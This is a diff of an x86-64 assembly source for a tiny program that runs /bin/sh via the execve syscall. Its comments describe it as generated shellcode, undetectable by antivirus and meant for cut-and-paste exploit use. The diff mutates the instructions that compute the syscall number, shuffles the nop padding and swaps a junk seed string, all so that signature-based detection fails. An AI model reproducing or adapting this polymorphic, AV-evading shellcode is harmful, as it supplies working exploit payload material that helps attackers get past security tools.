@@ -1,9 +1,9 @@
+; This is example only. Do not use. Generate new!!
 ;
 ;      ooo           ***           ...           ...           ...
 ;     (o o)         (o o)         (- -)         (. .)         (* *)
 ; ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-
 ;
-; Fully Undetectable exec /bin/sh program. No AV trigger.
 ; Generated from a script by CH405.
 ; Thx to 0x00000000 for idea. ^^
 ; Create smallest binary or cut and paste for shellcode use.
@@ -12,8 +12,6 @@
 ; Do not forget to chmod +x shellexec
 ;
 ; Have happy fun! Do not be bad man. Do not be illegal man
-;
-; Generate 2024-10-10 22:37:49
 
 bits 64
             org 0x08048000
@@ -55,22 +53,22 @@ _start:
     push rax
     push rsp
     pop rdi
-    sub eax, eax		; Random way to make eax equal 0
+    and eax, 0			; Random way to make eax equal 0
     push rax
-    mov al, 78			; Mutate function, start with random value
-    add al, 66			; add random value
-    sub al, 85			; make sure al has value 59 for exec syscall
+    mov al, 123			; Mutate function, start with random value
+    add al, 56			; add random value
+    sub al, 120			; make sure al has value 59 for exec syscall
     push rsp
     pop rdx
     push rsp
     pop rsi
-    nop				; No operation, Actually do nothing.
-    nop				; No operation, Actually do nothing.
-    nop				; No operation, Actually do nothing.
     syscall 			; calling function 59, exec
+    nop				; No operation, Actually do nothing.
+    nop				; No operation, Actually do nothing.
+    nop				; No operation, Actually do nothing.
 filesize      equ     $ - $$
 
 ; Insert generate junk. Can be removed but only add 8-10 bytes.
 ; Make signature identification almost impossible.
 section .data
-seed db "qRsA0:Pd"
+seed db "dim_a+Ko"
